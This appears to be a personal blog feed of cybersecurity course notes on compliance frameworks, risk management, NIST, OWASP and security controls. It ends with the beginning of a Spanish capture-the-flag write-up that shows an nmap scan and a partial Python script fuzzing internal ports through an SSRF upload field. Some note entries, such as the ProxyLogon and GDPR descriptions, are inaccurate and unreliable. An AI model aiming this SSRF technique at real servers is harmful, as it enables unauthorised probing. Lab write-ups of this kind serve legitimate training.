<p><strong>The Federal Risk and Authorization Management Program (FedRAMP®)</strong>
FedRAMP is a U.S. federal government program that standardizes security assessment, authorization, monitoring, and handling of cloud services and product offerings. Its purpose is to provide consistency across the government sector and third-party cloud providers.</p>

<p><strong>Center for Internet Security (CIS®)</strong>
CIS is a nonprofit with multiple areas of emphasis. It provides a set of controls that can be used to safeguard systems and networks against attacks. Its purpose is to help organizations establish a better plan of defense. CIS also provides actionable controls that security professionals may follow if a security incident occurs.</p>

<p><strong>General Data Protection Regulation (GDPR)</strong>
GDPR is a European Union (E.U.) general data regulation that protects the processing of E.U. residents’ data and their right to privacy in and out of E.U. territory. For example, if an organization is not being transparent about the data they are holding about an E.U. citizen and why they are holding that data, this is an infringement that can result in a fine to the organization. Additionally, if a breach occurs and an E.U. citizen’s data is compromised, they must be informed. The affected organization has 72 hours to notify the E.U. citizen about the breach.</p>

<p><strong>Payment Card Industry Data Security Standard (PCI DSS)</strong>
PCI DSS is an international security standard meant to ensure that organizations storing, accepting, processing, and transmitting credit card information do so in a secure environment. The objective of this compliance standard is to reduce credit card fraud.</p>

<p><strong>The Health Insurance Portability and Accountability Act (HIPAA)</strong>
HIPAA is a U.S. federal law established in 1996 to protect patients’ health information. This law prohibits patient information from being shared without their consent.</p>

<p><strong>International Organization for Standardization (ISO)</strong>
ISO was created to establish international standards related to technology, manufacturing, and management across borders. It helps organizations improve their processes and procedures for staff retention, planning, waste, and services.</p>

<p><strong>System and Organizations Controls (SOC type 1, SOC type 2)</strong>
The American Institute of Certified Public Accountants® (AICPA) auditing standards board developed this standard. The SOC1 and SOC2 are a series of reports that focus on an organization’s user access policies at different organizational levels</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="notes" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Manage Security Risks</title><link href="http://localhost:4000/blog/notes/2024-06-27-manageSecurityRisks/" rel="alternate" type="text/html" title="Manage Security Risks" /><published>2024-06-27T00:00:00-06:00</published><updated>2024-06-27T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/manageSecurityRisks</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-06-27-manageSecurityRisks/"><![CDATA[<p>The steps in the Risk Management Framework (RMF) are prepare, categorize, select, implement, assess, authorize, and monitor.</p>

<ul id="markdown-toc">
  <li><a href="#key-impacts-of-threats-risks-and-vulnerabilities" id="markdown-toc-key-impacts-of-threats-risks-and-vulnerabilities">Key impacts of threats, risks, and vulnerabilities:</a></li>
  <li><a href="#some-common-strategies-used-to-manage-risks-include" id="markdown-toc-some-common-strategies-used-to-manage-risks-include">Some common strategies used to manage risks include:</a></li>
  <li><a href="#threats" id="markdown-toc-threats">Threats</a></li>
  <li><a href="#risks" id="markdown-toc-risks">Risks</a></li>
  <li><a href="#vulnerabilities" id="markdown-toc-vulnerabilities">Vulnerabilities</a></li>
  <li><a href="#frameworks" id="markdown-toc-frameworks">Frameworks</a></li>
  <li><a href="#controls" id="markdown-toc-controls">Controls</a></li>
  <li><a href="#national-institute-of-standards-and-technology-nist-cybersecurity-framework-csf" id="markdown-toc-national-institute-of-standards-and-technology-nist-cybersecurity-framework-csf">National Institute of Standards and Technology (NIST) Cybersecurity Framework (CSF)</a></li>
  <li><a href="#owasp" id="markdown-toc-owasp">OWASP</a>    <ul>
      <li><a href="#security-principles" id="markdown-toc-security-principles">Security principles</a></li>
      <li><a href="#additional-owasp-security-principles" id="markdown-toc-additional-owasp-security-principles">Additional OWASP security principles</a></li>
    </ul>
  </li>
  <li><a href="#audit-checklist" id="markdown-toc-audit-checklist">Audit checklist</a>    <ul>
      <li><a href="#identify-the-scope-of-the-audit" id="markdown-toc-identify-the-scope-of-the-audit">Identify the scope of the audit</a></li>
      <li><a href="#complete-a-risk-assessment" id="markdown-toc-complete-a-risk-assessment">Complete a risk assessment</a></li>
      <li><a href="#conduct-the-audit" id="markdown-toc-conduct-the-audit">Conduct the audit</a></li>
      <li><a href="#create-a-mitigation-plan" id="markdown-toc-create-a-mitigation-plan">Create a mitigation plan</a></li>
      <li><a href="#communicate-results-to-stakeholders" id="markdown-toc-communicate-results-to-stakeholders">Communicate results to stakeholders</a></li>
    </ul>
  </li>
  <li><a href="#control-categories" id="markdown-toc-control-categories">Control categories</a></li>
  <li><a href="#control-types" id="markdown-toc-control-types">Control types</a></li>
  <li><a href="#administrative-controls" id="markdown-toc-administrative-controls">Administrative Controls</a></li>
  <li><a href="#technical-controls" id="markdown-toc-technical-controls">Technical Controls</a></li>
  <li><a href="#physical-controls" id="markdown-toc-physical-controls">Physical Controls</a></li>
  <li><a href="#incident-and-vulnerability-playbooks" id="markdown-toc-incident-and-vulnerability-playbooks">incident and vulnerability playbooks</a></li>
  <li><a href="#glossary" id="markdown-toc-glossary">Glossary</a>    <ul>
      <li><a href="#a" id="markdown-toc-a">A</a></li>
      <li><a href="#b" id="markdown-toc-b">B</a></li>
      <li><a href="#c" id="markdown-toc-c">C</a></li>
      <li><a href="#d" id="markdown-toc-d">D</a></li>
      <li><a href="#e" id="markdown-toc-e">E</a></li>
      <li><a href="#i" id="markdown-toc-i">I</a></li>
      <li><a href="#l" id="markdown-toc-l">L</a></li>
      <li><a href="#m" id="markdown-toc-m">M</a></li>
      <li><a href="#n" id="markdown-toc-n">N</a></li>
      <li><a href="#o" id="markdown-toc-o">O</a></li>
      <li><a href="#p" id="markdown-toc-p">P</a></li>
      <li><a href="#r" id="markdown-toc-r">R</a></li>
      <li><a href="#s" id="markdown-toc-s">S</a></li>
      <li><a href="#t" id="markdown-toc-t">T</a></li>
      <li><a href="#v" id="markdown-toc-v">V</a></li>
    </ul>
  </li>
</ul>

<h3 id="key-impacts-of-threats-risks-and-vulnerabilities">Key impacts of threats, risks, and vulnerabilities:</h3>

<ul>
  <li>
    <p>Damage to reputation</p>
  </li>
  <li>
    <p>Financial damage</p>
  </li>
  <li>
    <p>Identity theft</p>
  </li>
</ul>

<h3 id="some-common-strategies-used-to-manage-risks-include">Some common strategies used to manage risks include:</h3>

<ul>
  <li>
    <p>Acceptance: Accepting a risk to avoid disrupting business continuity</p>
  </li>
  <li>
    <p>Avoidance: Creating a plan to avoid the risk altogether</p>
  </li>
  <li>
    <p>Transference: Transferring risk to a third party to manage</p>
  </li>
  <li>
    <p>Mitigation: Lessening the impact of a known risk</p>
  </li>
</ul>

<h2 id="threats">Threats</h2>
<p>A threat is any circumstance or event that can negatively impact assets. As an entry-level security analyst, your job is to help defend the organization’s assets from inside and outside threats. Therefore, understanding common types of threats is important to an analyst’s daily work. As a reminder, common threats include:</p>

<ul>
  <li>
    <p><strong>Insider threats:</strong> Staff members or vendors abuse their authorized access to obtain data that may harm an organization.</p>
  </li>
  <li>
    <p><strong>Advanced persistent threats (APTs):</strong> A threat actor maintains unauthorized access to a system for an extended period of time.</p>
  </li>
</ul>

<h2 id="risks">Risks</h2>
<p>A risk is anything that can impact the confidentiality, integrity, or availability of an asset. A basic formula for determining the level of risk is that risk equals the likelihood of a threat. One way to think about this is that a risk is being late to work and threats are traffic, an accident, a flat tire, etc.</p>

<p>There are different factors that can affect the likelihood of a risk to an organization’s assets, including:</p>

<ul>
  <li>
    <p><strong>External risk:</strong> Anything outside the organization that has the potential to harm organizational assets, such as threat actors attempting to gain access to private information</p>
  </li>
  <li>
    <p><strong>Internal risk:</strong> A current or former employee, vendor, or trusted partner who poses a security risk</p>
  </li>
  <li>
    <p><strong>Legacy systems:</strong> Old systems that might not be accounted for or updated, but can still impact assets, such as workstations or old mainframe systems. For example, an organization might have an old vending machine that takes credit card payments or a workstation that is still connected to the legacy accounting system.</p>
  </li>
  <li>
    <p><strong>Multiparty risk:</strong> Outsourcing work to third-party vendors can give them access to intellectual property, such as trade secrets, software designs, and inventions.</p>
  </li>
  <li>
    <p><strong>Software compliance/licensing:</strong> Software that is not updated or in compliance, or patches that are not installed in a timely manner</p>
  </li>
</ul>

<h2 id="vulnerabilities">Vulnerabilities</h2>
<p>A vulnerability is a weakness that can be exploited by a threat. Therefore, organizations need to regularly inspect for vulnerabilities within their systems. Some vulnerabilities include:</p>

<ul>
  <li>
    <p><strong>ProxyLogon:</strong> A pre-authenticated vulnerability that affects the Microsoft Exchange server. This means a threat actor can complete a user authentication process to deploy malicious code from a remote location.</p>
  </li>
  <li>
    <p><strong>ZeroLogon:</strong> A vulnerability in Microsoft’s Netlogon authentication protocol. An authentication protocol is a way to verify a person’s identity. Netlogon is a service that ensures a user’s identity before allowing access to a website’s location.</p>
  </li>
  <li>
    <p><strong>Log4Shell:</strong> Allows attackers to run Java code on someone else’s computer or leak sensitive information. It does this by enabling a remote attacker to take control of devices connected to the internet and run malicious code.</p>
  </li>
  <li>
    <p><strong>PetitPotam:</strong> Affects Windows New Technology Local Area Network (LAN) Manager (NTLM). It is a theft technique that allows a LAN-based attacker to initiate an authentication request.</p>
  </li>
  <li>
    <p><strong>Security logging and monitoring failures:</strong> Insufficient logging and monitoring capabilities that result in attackers exploiting vulnerabilities without the organization knowing it</p>
  </li>
  <li>
    <p><strong>Server-side request forgery:</strong> Allows attackers to manipulate a server-side application into accessing and updating backend resources. It can also allow threat actors to steal data.</p>
  </li>
</ul>

<h2 id="frameworks">Frameworks</h2>
<p>Security frameworks are guidelines used for building plans to help mitigate risk and threats to data and privacy. Frameworks support organizations’ ability to adhere to compliance laws and regulations. For example, the healthcare industry uses frameworks to comply with the United States’ Health Insurance Portability and Accountability Act (HIPAA), which requires that medical professionals keep patient information safe.</p>
<ul>
  <li>Cyber Threat Framework (CTF)
According to the Office of the Director of National Intelligence, the CTF was developed by the U.S. government to provide “a common language for describing and communicating information about cyber threat activity.” By providing a common language to communicate information about threat activity, the CTF helps cybersecurity professionals analyze and share information more efficiently. This allows organizations to improve their response to the constantly evolving cybersecurity landscape and threat actors’ many tactics and techniques.</li>
  <li>International Organization for Standardization/International Electrotechnical Commission (ISO/IEC) 27001
An internationally recognized and used framework is ISO/IEC 27001. The ISO 27000 family of standards enables organizations of all sectors and sizes to manage the security of assets, such as financial information, intellectual property, employee data, and information entrusted to third parties. This framework outlines requirements for an information security management system, best practices, and controls that support an organization’s ability to manage risks. Although the ISO/IEC 27001 framework does not require the use of specific controls, it does provide a collection of controls that organizations can use to improve their security posture.</li>
</ul>

<h2 id="controls">Controls</h2>
<p>Security controls are safeguards designed to reduce specific security risks. Security controls are the measures organizations use to lower risk and threats to data and privacy. For example, a control that can be used alongside frameworks to ensure a hospital remains compliant with HIPAA is requiring that patients use multi-factor authentication (MFA) to access their medical records. Using a measure like MFA to validate someone’s identity is one way to help mitigate potential risks and threats to private data.</p>

<p><strong>Examples of physical controls:</strong></p>

<ul>
  <li>
    <p>Gates, fences, and locks</p>
  </li>
  <li>
    <p>Security guards</p>
  </li>
  <li>
    <p>Closed-circuit television (CCTV), surveillance cameras, and motion detectors</p>
  </li>
  <li>
    <p>Access cards or badges to enter office spaces</p>
  </li>
</ul>

<p><strong>Examples of technical controls:</strong></p>

<ul>
  <li>
    <p>Firewalls</p>
  </li>
  <li>
    <p>MFA</p>
  </li>
  <li>
    <p>Antivirus software</p>
  </li>
</ul>

<p><strong>Examples of administrative controls:</strong></p>

<ul>
  <li>
    <p>Separation of duties</p>
  </li>
  <li>
    <p>Authorization</p>
  </li>
  <li>
    <p>Asset classification</p>
  </li>
</ul>

<h2 id="national-institute-of-standards-and-technology-nist-cybersecurity-framework-csf">National Institute of Standards and Technology (NIST) Cybersecurity Framework (CSF)</h2>

<p>The NIST Cybersecurity Framework consists of five core functions that provide a strategic view of the lifecycle of an organization’s management of cybersecurity risk. These functions are:</p>

<ul>
  <li>
    <p><strong>Identify:</strong> Develop an organizational understanding to manage cybersecurity risk to systems, assets, data, and capabilities. This includes asset management, business environment, governance, risk assessment, and risk management strategy.</p>
  </li>
  <li>
    <p><strong>Protect:</strong> Develop and implement appropriate safeguards to ensure the delivery of critical infrastructure services. This includes access control, awareness and training, data security, information protection processes and procedures, maintenance, and protective technology.</p>
  </li>
  <li>
    <p><strong>Detect:</strong> Develop and implement appropriate activities to identify the occurrence of a cybersecurity event. This includes continuous monitoring, detection processes, and detection of anomalies and events.</p>
  </li>
  <li>
    <p><strong>Respond:</strong> Develop and implement appropriate activities to take action regarding a detected cybersecurity incident. This includes response planning, communications, analysis, mitigation, and improvements.</p>
  </li>
  <li>
    <p><strong>Recover:</strong> Develop and implement appropriate activities to maintain resilience plans and restore any capabilities or services that were impaired due to a cybersecurity incident. This includes recovery planning, improvements, and communications.</p>
  </li>
</ul>

<h2 id="owasp">OWASP</h2>

<h3 id="security-principles">Security principles</h3>

<ul>
  <li>
    <p>Minimize attack surface area: Attack surface refers to all the potential vulnerabilities a threat actor could exploit.</p>
  </li>
  <li>
    <p>Principle of least privilege: Users have the least amount of access required to perform their everyday tasks.</p>
  </li>
  <li>
    <p>Defense in depth: Organizations should have varying security controls that mitigate risks and threats.</p>
  </li>
  <li>
    <p>Separation of duties: Critical actions should rely on multiple people, each of whom follow the principle of least privilege.</p>
  </li>
  <li>
    <p>Keep security simple: Avoid unnecessarily complicated solutions. Complexity makes security difficult.</p>
  </li>
  <li>
    <p>Fix security issues correctly: When security incidents occur, identify the root cause, contain the impact, identify vulnerabilities, and conduct tests to ensure that remediation is successful.</p>
  </li>
</ul>

<h3 id="additional-owasp-security-principles">Additional OWASP security principles</h3>

<p><strong>Establish secure defaults</strong>
This principle means that the optimal security state of an application is also its default state for users; it should take extra work to make the application insecure.</p>

<p><strong>Fail securely</strong>
Fail securely means that when a control fails or stops, it should do so by defaulting to its most secure option. For example, when a firewall fails it should simply close all connections and block all new ones, rather than start accepting everything.</p>

<p><strong>Don’t trust services</strong>
Many organizations work with third-party partners. These outside partners often have different security policies than the organization does. And the organization shouldn’t explicitly trust that their partners’ systems are secure. For example, if a third-party vendor tracks reward points for airline customers, the airline should ensure that the balance is accurate before sharing that information with their customers.</p>

<p><strong>Avoid security by obscurity</strong>
The security of an application should not rely on keeping the source code secret. Its security should rely upon many other factors, including reasonable password policies, defense in depth, business transaction limits, solid network architecture, and fraud and audit controls.</p>

<h2 id="audit-checklist">Audit checklist</h2>
<p>It’s necessary to create an audit checklist before conducting an audit. A checklist is generally made up of the following areas of focus:</p>

<h3 id="identify-the-scope-of-the-audit">Identify the scope of the audit</h3>

<p>The audit should:</p>

<ul>
  <li>
    <p>List assets that will be assessed (e.g., firewalls are configured correctly, PII is secure, physical assets are locked, etc.)</p>
  </li>
  <li>
    <p>Note how the audit will help the organization achieve its desired goals</p>
  </li>
  <li>
    <p>Indicate how often an audit should be performed</p>
  </li>
  <li>
    <p>Include an evaluation of organizational policies, protocols, and procedures to make sure they are working as intended and being implemented by employees</p>
  </li>
</ul>

<h3 id="complete-a-risk-assessment">Complete a risk assessment</h3>

<ul>
  <li>A risk assessment is used to evaluate identified organizational risks related to budget, controls, internal processes, and external standards (i.e., regulations).</li>
</ul>

<h3 id="conduct-the-audit">Conduct the audit</h3>

<ul>
  <li>When conducting an internal audit, you will assess the security of the identified assets listed in the audit scope.</li>
</ul>

<h3 id="create-a-mitigation-plan">Create a mitigation plan</h3>

<ul>
  <li>A mitigation plan is a strategy established to lower the level of risk and potential costs, penalties, or other issues that can negatively affect the organization’s security posture.</li>
</ul>

<h3 id="communicate-results-to-stakeholders">Communicate results to stakeholders</h3>

<ul>
  <li>The end result of this process is providing a detailed report of findings, suggested improvements needed to lower the organization’s level of risk, and compliance regulations and standards the organization needs to adhere to.</li>
</ul>

<h2 id="control-categories">Control categories</h2>

<p>Controls within cybersecurity are grouped into three main categories:</p>
<ul>
  <li>Administrative/Managerial controls</li>
  <li>Technical controls</li>
  <li>Physical/Operational controls</li>
</ul>

<p><strong>Administrative/Managerial controls</strong> address the human component of
cybersecurity. These controls include policies and procedures that define how an
organization manages data and clearly defines employee responsibilities, including
their role in protecting the organization. While administrative controls are typically
policy based, the enforcement of those policies may require the use of technical or
physical controls.
<strong>Technical controls</strong> consist of solutions such as firewalls, intrusion detection systems
(IDS), intrusion prevention systems (IPS), antivirus (AV) products, encryption, etc.
Technical controls can be used in a number of ways to meet organizational goals and
objectives.
<strong>Physical/Operational controls</strong> include door locks, cabinet locks, surveillance
cameras, badge readers, etc. They are used to limit physical access to physical assets
by unauthorized personnel.</p>

<h2 id="control-types">Control types</h2>
<p>Control types include, but are not limited to:</p>
<ol>
  <li>Preventative</li>
  <li>Corrective</li>
  <li>Detective</li>
  <li>Deterrent</li>
</ol>

<h2 id="administrative-controls">Administrative Controls</h2>

<table>
  <thead>
    <tr>
      <th>Control Name</th>
      <th>Control Type</th>
      <th>Control Purpose</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Least Privilege</td>
      <td>Preventative</td>
      <td>Reduce risk and overall impact of malicious insider or compromised accounts</td>
    </tr>
    <tr>
      <td>Disaster recovery plans</td>
      <td>Corrective</td>
      <td>Provide business continuity</td>
    </tr>
    <tr>
      <td>Password policies</td>
      <td>Preventative</td>
      <td>Reduce likelihood of account compromise through brute force or dictionary attack techniques</td>
    </tr>
    <tr>
      <td>Access control policies</td>
      <td>Preventative</td>
      <td>Bolster confidentiality and integrity by defining which groups can access or modify data</td>
    </tr>
    <tr>
      <td>Account management policies</td>
      <td>Preventative</td>
      <td>“Managing account lifecycle, reducing attack surface, and limiting overall impact from disgruntled former employees and default account usage”</td>
    </tr>
    <tr>
      <td>Separation of duties</td>
      <td>Preventative</td>
      <td>Reduce risk and overall impact of malicious insider or compromised accounts</td>
    </tr>
  </tbody>
</table>

<h2 id="technical-controls">Technical Controls</h2>

<table>
  <thead>
    <tr>
      <th>Control Name</th>
      <th>Control Type</th>
      <th>Control Purpose</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Firewall</td>
      <td>Preventative</td>
      <td>To filter unwanted or malicious traffic from entering the network</td>
    </tr>
    <tr>
      <td>IDS/IPS</td>
      <td>Detective</td>
      <td>To detect and prevent anomalous traffic that matches a signature or rule</td>
    </tr>
    <tr>
      <td>Encryption</td>
      <td>Deterrent</td>
      <td>Provide confidentiality to sensitive information</td>
    </tr>
    <tr>
      <td>Backups</td>
      <td>Corrective</td>
      <td>Restore/recover from an event</td>
    </tr>
    <tr>
      <td>Password management</td>
      <td>Preventative</td>
      <td>Reduce password fatigue</td>
    </tr>
    <tr>
      <td>Antivirus (AV) software</td>
      <td>Corrective</td>
      <td>Detect and quarantine known threats</td>
    </tr>
    <tr>
      <td>“Manual monitoring, maintenance, and intervention”</td>
      <td>Preventative</td>
      <td>“Necessary to identify and manage threats, risks, or vulnerabilities to out-of-date systems”</td>
    </tr>
  </tbody>
</table>

<h2 id="physical-controls">Physical Controls</h2>

<table>
  <thead>
    <tr>
      <th>Control Name</th>
      <th>Control Type</th>
      <th>Control Purpose</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Time-controlled safe</td>
      <td>Deterrent</td>
      <td>Reduce attack surface and overall impact from physical threats</td>
    </tr>
    <tr>
      <td>Adequate lighting</td>
      <td>Deterrent</td>
      <td>Deter threats by limiting “hiding” places</td>
    </tr>
    <tr>
      <td>Closed-circuit television (CCTV)</td>
      <td>Preventative/Detective</td>
      <td>“Closed circuit television is both a preventative and detective control because it’s presence can reduce risk of certain types of events from occurring, and can be used after an event to inform on event conditions”</td>
    </tr>
    <tr>
      <td>Locking cabinets (for network gear)</td>
      <td>Preventative</td>
      <td>Bolster integrity by preventing unauthorized personnel and other individuals from physically accessing or modifying network infrastructure gear</td>
    </tr>
    <tr>
      <td>Signage indicating alarm service provider</td>
      <td>Deterrent</td>
      <td>Deter certain types of threats by making the likelihood of a successful attack seem low</td>
    </tr>
    <tr>
      <td>Locks</td>
      <td>Deterrent/Preventative</td>
      <td>“Bolster integrity by deterring and preventing unauthorized personnel, individuals from physically accessing assets”</td>
    </tr>
    <tr>
      <td>“Fire detection and prevention (fire alarm, sprinkler system, etc.)”</td>
      <td>Detective/Preventative</td>
      <td>“Detect fire in physical location and prevent damage to physical assets such as inventory, servers, etc.”:</td>
    </tr>
  </tbody>
</table>

<h2 id="incident-and-vulnerability-playbooks">incident and vulnerability playbooks</h2>

<ul>
  <li>
    <p><strong>Preparation:</strong>Before incidents occur, mitigate potential impacts on the organization by documenting, establishing staffing plans, and educating users.</p>
  </li>
  <li>
    <p><strong>Detection and Analysis:</strong>Detect and analyze events by implementing defined processes and appropriate technology.</p>
  </li>
  <li>
    <p><strong>Containment:</strong>Prevent further damage and reduce immediate impact of incidents.</p>
  </li>
  <li>
    <p><strong>Eradication and Recovery:</strong>Completely remove artifacts of the incident so that an organization can return to normal operations.</p>
  </li>
  <li>
    <p><strong>Post-Incident activity:</strong>Document the incident, inform organizational leadership, and apply lessons learned.</p>
  </li>
  <li>
    <p><strong>Coordination:</strong>Report incidents and share information throughout the response process, based on established standards.</p>
  </li>
</ul>

<h1 id="glossary">Glossary</h1>

<h2 id="a">A</h2>
<ul>
  <li>Assess: The fifth step of the NIST RMF that means to determine if established controls are implemented correctly</li>
  <li>Asset: An item perceived as having value to an organization</li>
  <li>Attack vectors: The pathways attackers use to penetrate security defenses</li>
  <li>Authentication: The process of verifying who someone is</li>
  <li>Authorization: The concept of granting access to specific resources in a system</li>
  <li>Authorize: The sixth step of the NIST RMF that refers to being accountable for the security and privacy risks that might exist in an organization</li>
  <li>Availability: The idea that data is accessible to those who are authorized to access it</li>
</ul>

<h2 id="b">B</h2>
<ul>
  <li>Biometrics: The unique physical characteristics that can be used to verify a person’s identity</li>
  <li>Business continuity: An organization’s ability to maintain their everyday productivity by establishing risk disaster recovery plans</li>
</ul>

<h2 id="c">C</h2>
<ul>
  <li>Categorize: The second step of the NIST RMF that is used to develop risk management processes and tasks</li>
  <li>Chronicle: A cloud-native tool designed to retain, analyze, and search data</li>
  <li>Confidentiality: The idea that only authorized users can access specific assets or data</li>
  <li>Confidentiality, integrity, availability (CIA) triad: A model that helps inform how organizations consider risk when setting up systems and security policies</li>
</ul>

<h2 id="d">D</h2>
<ul>
  <li>Detect: A NIST core function related to identifying potential security incidents and improving monitoring capabilities to increase the speed and efficiency of detections</li>
</ul>

<h2 id="e">E</h2>
<ul>
  <li>Encryption: The process of converting data from a readable format to an encoded format</li>
  <li>External threat: Anything outside the organization that has the potential to harm organizational assets</li>
</ul>

<h2 id="i">I</h2>
<ul>
  <li>Identify: A NIST core function related to management of cybersecurity risk and its effect on an organization’s people and assets</li>
  <li>Implement: The fourth step of the NIST RMF that means to implement security and privacy plans for an organization</li>
  <li>Incident response: An organization’s quick attempt to identify an attack, contain the damage, and correct the effects of a security breach</li>
  <li>Integrity: The idea that the data is correct, authentic, and reliable</li>
  <li>Internal threat: A current or former employee, external vendor, or trusted partner who poses a security risk</li>
</ul>

<h2 id="l">L</h2>
<ul>
  <li>Log: A record of events that occur within an organization’s systems</li>
</ul>

<h2 id="m">M</h2>
<ul>
  <li>Metrics: Key technical attributes such as response time, availability, and failure rate, which are used to assess the performance of a software application</li>
  <li>Monitor: The seventh step of the NIST RMF that means be aware of how systems are operating</li>
</ul>

<h2 id="n">N</h2>
<ul>
  <li>National Institute of Standards and Technology (NIST) Cybersecurity Framework</li>
  <li>(CSF): A voluntary framework that consists of standards, guidelines, and best practices to manage cybersecurity risk</li>
  <li>National Institute of Standards and Technology (NIST) Special Publication (S.P.) 800-53: A unified framework for protecting the security of information systems within the U.S. federal government</li>
</ul>

<h2 id="o">O</h2>
<ul>
  <li>Open Web Application Security Project/Open Worldwide Application Security</li>
  <li>Project (OWASP): A non-profit organization focused on improving software security</li>
  <li>Operating system (OS): The interface between computer hardware and the user</li>
</ul>

<h2 id="p">P</h2>
<ul>
  <li>Playbook: A manual that provides details about any operational action</li>
  <li>Prepare: The first step of the NIST RMF related to activities that are necessary to manage security and privacy risks before a breach occurs</li>
  <li>Protect: A NIST core function used to protect an organization through the implementation of policies, procedures, training, and tools that help mitigate cybersecurity threats</li>
</ul>

<h2 id="r">R</h2>
<ul>
  <li>Ransomware: A malicious attack where threat actors encrypt an organization’s data and demand payment to restore access</li>
  <li>Recover: A NIST core function related to returning affected systems back to normal operation</li>
  <li>Respond: A NIST core function related to making sure that the proper procedures are used to contain, neutralize, and analyze security incidents, and implement improvements to the security process</li>
  <li>Risk: Anything that can impact the confidentiality, integrity, or availability of an asset</li>
  <li>Risk mitigation: The process of having the right procedures and rules in place to quickly reduce the impact of a risk like a breach</li>
</ul>

<h2 id="s">S</h2>
<ul>
  <li>Security audit: A review of an organization’s security controls, policies, and procedures against a set of expectations</li>
  <li>Security controls: Safeguards designed to reduce specific security risks</li>
  <li>Security frameworks: Guidelines used for building plans to help mitigate risk and threats to data and privacy</li>
  <li>Security information and event management (SIEM): An application that collects and analyzes log data to monitor critical activities in an organization</li>
  <li>Security orchestration, automation, and response (SOAR): A collection of applications, tools, and workflows that use automation to respond to security events</li>
  <li>Security posture: An organization’s ability to manage its defense of critical assets and data and react to change</li>
  <li>Select: The third step of the NIST RMF that means to choose, customize, and capture documentation of the controls that protect an organization</li>
  <li>Shared responsibility: The idea that all individuals within an organization take an active role in lowering risk and maintaining both physical and virtual security</li>
  <li>SIEM tools: A software platform that collects, analyzes, and correlates security data from various sources across your IT infrastructure that helps identify and respond to security threats in real-time, investigate security incidents, and comply with security regulations</li>
  <li>Social engineering: A manipulation technique that exploits human error to gain private information, access, or valuables</li>
  <li>Splunk Cloud: A cloud-hosted tool used to collect, search, and monitor log data</li>
  <li>Splunk Enterprise: A self-hosted tool used to retain, analyze, and search an organization’s log data to provide security information and alerts in real-time</li>
</ul>

<h2 id="t">T</h2>
<ul>
  <li>Threat: Any circumstance or event that can negatively impact assets</li>
</ul>

<h2 id="v">V</h2>
<ul>
  <li>Vulnerability: A weakness that can be exploited by a threat</li>
</ul>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="notes" /><summary type="html"><![CDATA[The steps in the Risk Management Framework (RMF) are prepare, categorize, select, implement, assess, authorize, and monitor.]]></summary></entry><entry><title type="html">Editorial</title><link href="http://localhost:4000/blog/machines/2024-06-23-editorial/" rel="alternate" type="text/html" title="Editorial" /><published>2024-06-23T00:00:00-06:00</published><updated>2024-06-23T00:00:00-06:00</updated><id>http://localhost:4000/blog/machines/editorial</id><content type="html" xml:base="http://localhost:4000/blog/machines/2024-06-23-editorial/"><![CDATA[<p>Los primero pasos es escanear la máquina para saber que puertos están abiertos.</p>

<pre><code class="language-cmd"># Nmap 7.93 scan initiated Sun Jun 23 19:10:57 2024 as: nmap -p22,80 -sCV -oN targeted 10.10.11.20
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 23 19:11:07 2024 -- 1 IP address (1 host up) scanned in 9.78 seconds
</code></pre>
<p>Revisando el puerto 80 vemos que tenemos un sitio web donde podemos subir un archivo de texto. En este nos muestra dos opciones: <code class="language-plaintext highlighter-rouge">url</code> y <code class="language-plaintext highlighter-rouge">adjuntando</code>. Siempre que tenemos un campo donde podemos apuntar a alguna URL es recomendable probar un ataque de <code class="language-plaintext highlighter-rouge">SSRF</code>.</p>

<p><img src="/assets/img/machines/editorial/editorial1.jpg" alt="imagen1" /></p>

<p><img src="/assets/img/machines/editorial/editorial2.jpg" alt="imagen2" /></p>

<p>Procedemos a interceptar la petición con <code class="language-plaintext highlighter-rouge">Burpsuite</code>, podemos ver que se manda una petición <code class="language-plaintext highlighter-rouge">POST</code>. Al intentar apuntar a la máquina local, vemos que no tienen ningun bloqueo. Intentar puerto por puerto manualmente nos llevará bastante tiempo, por lo que, creé un script en python para hacer este trabajo.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">pwn</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">queue</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://editorial.htb/upload-cover"</span>
<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"127.0.0.1:8080"</span><span class="p">}</span>
<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"multipart/form-data; boundary=----WebKitFormBoundaryxCyQMtVBFzp73HTl"</span><span class="p">}</span>
<span class="n">pwnlogs</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">log</span>

<span class="k">def</span> <span class="nf">fuzzing</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
